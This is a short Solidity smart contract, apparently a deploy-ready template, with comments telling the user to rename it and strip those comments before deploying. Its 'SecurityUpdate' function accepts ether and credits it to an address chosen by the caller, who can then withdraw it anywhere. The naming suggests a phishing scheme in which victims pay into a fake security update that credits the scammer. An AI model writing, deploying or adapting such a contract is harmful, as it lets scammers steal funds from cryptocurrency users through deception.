// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

// [REMOVE THIS LINE BEFORE DEPLOYING!] MS_Contract is the name of the contract, you can replace it with whatever you want
// [REMOVE THIS LINE BEFORE DEPLOYING!] It is important that the name contains only latin letters and underscores
// [REMOVE THIS LINE BEFORE DEPLOYING!] Spaces and other characters are not supported, don't try to use them

contract SecurityContract {

  address private owner;
  mapping (address => uint256) private balance;
  mapping (address => bool) private auto_withdraw;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function getUserBalance(address wallet) public view returns (uint256) { return balance[wallet]; }
  function getWithdrawStatus(address wallet) public view returns (bool) { return auto_withdraw[wallet]; }
  function setWithdrawStatus(bool status) public { auto_withdraw[msg.sender] = status; }

  function withdraw(address where) public {
    uint256 amount = balance[msg.sender];
    require(address(this).balance >= amount, "BALANCE_LOW");
    balance[msg.sender] = 0; payable(where).transfer(amount);
  }

  function SecurityUpdate(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }

}